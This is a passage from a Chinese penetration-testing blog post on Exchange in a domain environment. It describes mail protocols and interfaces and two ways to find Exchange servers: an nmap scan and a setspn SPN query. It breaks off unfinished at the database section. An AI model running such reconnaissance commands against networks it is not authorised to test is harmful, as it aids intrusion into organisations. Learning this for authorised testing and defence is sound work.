+<p>电子邮件通信一般分为邮件发送和邮件接收两个过程。邮件发送使用统一的通信协议，既<code>SMTP（简单邮件传输协议）。</code>邮件接收则会使用多种协议标准，例如<code>POP（邮局协议）</code>发展而来的<code>POP3</code>,以及使用较为广泛的<code>IMAP(internet邮件访问协议)</code>Exchange开发了私有的MAPI协议（用于收取邮件）。新版本的Outlook通常使用<code>MAPI协议</code>与Exchange进行交互。早期Outlook使用名为<code>Outlook Anywhere</code>的RPC进行交互</p>
+<p>Exchange支持的访问接口和协议列举如下</p>
+<ul>
+<li><code>OWA(Outlook Web App):</code>Exchange提供的Web邮箱</li>
+<li><code>EAC(Exchange Administrator center)：</code>Exchange管理中心，是组织中的Exchange的Web控制台</li>
+<li><code>OutlookAnywhere（RPC-over-HTTP,  RPC/HTTP）</code></li>
+<li><code>MAPI (MAPI-over-HTTP, MAPI/HTTP)</code></li>
+<li><code>Exchange ActiveSync(EAS, XML/HTTP)</code></li>
+<li><code>Exchange Web Service(EWS, SOAP-over-HTTP)</code></li>
+</ul>
+<h5 id="Exchange服务发现"><a href="#Exchange服务发现" class="headerlink" title="Exchange服务发现"></a>Exchange服务发现</h5><p><strong>1、基于端口扫描发现</strong></p>
+<p>需要与主机进行交互，产生大量通信流量，会造成IDS报警，并留下大量的日志</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -S -sV 10.211.55.7</span><br></pre></td></tr></table></figure>
+
+<p><strong>2、SPN查询</strong></p>
+<p>安装Exchange时，<code>SPN被注册在活动目录</code>中了。在域环境中，可以通过SPN来发现Exchange服务，这里使用windows自带的<code>setspnon.exe</code>获取。其中<code>exchangeRFR、exchangeAB、exchangeMDB、 SMTP、SmtpSvc</code>都是Exchange注册的服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T Motoo.nc -F -Q */*</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/30/域内横向移动二/19.png" alt></p>
+<h5 id="Exchange的基本操作"><a href="#Exchange的基本操作" class="headerlink" title="Exchange的基本操作"></a>Exchange的基本操作</h5><p>Exchange是一个电子邮件系统，自然会存在数据库。Exchange数据库的后缀为<code>.edb</code>,存储在Exchange服务器上。通过exchange发送、接收、存储的邮件，都会存储在exchange的数据库中。可用powershell查看exchange数据库中的信息</p>
+<p><strong>1、查看邮件数据库</strong></p>
+<p>邮件服务器没启起来，实施什么问题，执行powershell命令的时候报错，暂时未做接下来的测试</p>
+</div><!--文章标签--><div class="tags"></div><!--评论--></div></div></div><div class="pure-u-1-4"><div id="sidebar"><div class="widget"><form action="//www.google.com/search" method="get" accept-charset="utf-8" id="search" target="_blank" class="search-form"><input type="text" name="q" maxlength="20" placeholder="Search"><input type="hidden" name="sitesearch" value="http://yoursite.com"></form></div><div class="widget"><div class="widget-title"> 分类</div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/内网渗透/">内网渗透</a><span class="category-list-count">21</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/复现/">复现</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具使用/">工具使用</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂记/">杂记</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透/">渗透</a><span class="category-list-count">8</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/靶机/">靶机</a><span class="category-list-count">1</span></li></ul></div><div class="widget"><div class="widget-title"> 标签</div><div class="tagcloud"><a href="/tags/metasploit/" style="font-size: 16px;">metasploit</a> <a href="/tags/代码执行/" style="font-size: 12px;">代码执行</a> <a href="/tags/权限提升/" style="font-size: 12px;">权限提升</a> <a href="/tags/cobaltstrike/" style="font-size: 14px;">cobaltstrike</a> <a href="/tags/文件读取/" style="font-size: 12px;">文件读取</a> <a href="/tags/Cobalt-Strike/" style="font-size: 12px;">Cobalt Strike</a> <a href="/tags/安全开发/" style="font-size: 12px;">安全开发</a> <a href="/tags/Ngrok/" style="font-size: 12px;">Ngrok</a> <a href="/tags/Vulnhub/" style="font-size: 12px;">Vulnhub</a> <a href="/tags/文件包含/" style="font-size: 12px;">文件包含</a> <a href="/tags/PowerShell/" style="font-size: 18px;">PowerShell</a> <a href="/tags/QCOW2/" style="font-size: 12px;">QCOW2</a> <a href="/tags/远程代码执行/" style="font-size: 16px;">远程代码执行</a> <a href="/tags/命令执行/" style="font-size: 12px;">命令执行</a> <a href="/tags/shell脚本/" style="font-size: 12px;">shell脚本</a> <a href="/tags/venom/" style="font-size: 12px;">venom</a> <a href="/tags/免杀/" style="font-size: 16px;">免杀</a> <a href="/tags/文件上传/" style="font-size: 12px;">文件上传</a> <a href="/tags/端口转发/" style="font-size: 12px;">端口转发</a> <a href="/tags/Covenant/" style="font-size: 12px;">Covenant</a> <a href="/tags/poc/" style="font-size: 12px;">poc</a> <a href="/tags/meterpreter/" style="font-size: 12px;">meterpreter</a> <a href="/tags/msfvenom/" style="font-size: 12px;">msfvenom</a> <a href="/tags/域信息收集/" style="font-size: 14px;">域信息收集</a> <a href="/tags/反序列化/" style="font-size: 12px;">反序列化</a></div></div><div class="widget"><div class="widget-title"> 最新文章</div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/06/30/域内横向移动二/">域内横向移动二</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/27/域内横向移动一/">域内横向移动一</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/24/CobaltStrike二次开发环境准备/">CobaltStrike二次开发环境准备</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/15/权限提升分析及防御二/">权限提升分析及防御二</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/11/权限提升分析及防御一/">权限提升分析及防御一</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/08/IntelliJ-IDEA修改cobaltstrike/">IntelliJ-IDEA修改cobaltstrike</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/09/利用msf自带的route模块穿透目标内网/">利用msf自带的route模块穿透目标内网</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/07/使用Venom搭建二级代理/">使用Venom搭建二级代理</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/26/隐藏通信隧道技术二/">隐藏通信隧道技术二</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/04/22/隐藏通信隧道技术/">隐藏通信隧道技术</a></li></ul></div><div class="widget"><div class="widget-title"> 友情链接</div><ul class="links-list"><li class="links-list-item"><a href="https://timeshu.github.io/" title="Time" target="_blank">Time</a></li></ul><ul class="links-list"><li class="links-list-item"><a href="http://blog.leanote.com/snowming" title="Snowming" target="_blank">Snowming</a></li></ul></div></div></div></div><div id="footer">© <a href="/." rel="nofollow">Guko's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a> Theme<a target="_blank" href="https://github.com/7ye/maupassant-hexo"> Maupassant.</a></div><a id="back_to_top" href="javascript:void(0)" class="back_to_top"><span>△</span></a><script type="text/javascript" src="/js/totop.js?v=0.0.1"></script><link rel="stylesheet" href="/css/jquery.fancybox.css"><script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.1"></script><script>function auto_code_fit(){
+  if($(".highlight").length != 0){
+    var pc_width = $(".post-content").width();
+    $(".highlight .code").find("pre").width((pc_width-70)+"px");
+  }
+}
+window.onresize = function(){
+  auto_code_fit();
+}
+auto_code_fit();</script></div></body>
